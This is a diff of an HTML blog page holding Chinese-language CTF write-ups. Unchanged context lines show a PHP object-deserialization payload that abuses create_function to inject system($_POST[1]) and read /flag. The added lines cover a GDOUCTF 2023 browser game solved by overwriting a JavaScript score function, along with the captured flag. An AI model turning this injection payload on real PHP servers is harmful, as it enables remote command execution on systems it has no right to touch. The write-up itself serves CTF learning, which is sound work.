@@ -101,6 +101,10 @@
 <p>system没被过滤,但是引号被过滤了,<br>可以使用$_POST再次传即可参绕过,</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Noteasy&#123;</span><br><span class="line">    protected $param1 = &quot;create_function&quot;;</span><br><span class="line">    protected $param2 = &quot;&#125;;system(\$_POST[1]);//&quot;; #*号被过滤截断最后一个大括号用// </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = new Noteasy();</span><br><span class="line">echo base64_encode(serialize($a));</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">post传参 1=cat /flag</span><br></pre></td></tr></table></figure>
 
+<h1 id="GDOUCTF-2023"><a href="#GDOUCTF-2023" class="headerlink" title="GDOUCTF 2023"></a>GDOUCTF 2023</h1><h3 id="web-1"><a href="#web-1" class="headerlink" title="web"></a>web</h3><h5 id="hate-eat-snake"><a href="#hate-eat-snake" class="headerlink" title="hate eat snake"></a>hate eat snake</h5><p>这个题目有很多方法<br>我直接是尝试重写js里面的getScore方法，直接把score这个变量改为一个很大值，然后分数超过60分，便可以拿到flag</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20240413150236.png" alt="20240413150236"></p>
+<p>应该同样可以拿到生成flag的js代码放到控制台上面去执行。</p>
+<p><code>NSSCTF&#123;J_0k3r_h0pe_to_have_@_girlfriend&#125;</code></p>
 
                 
                 <p class="end">__END__</p>
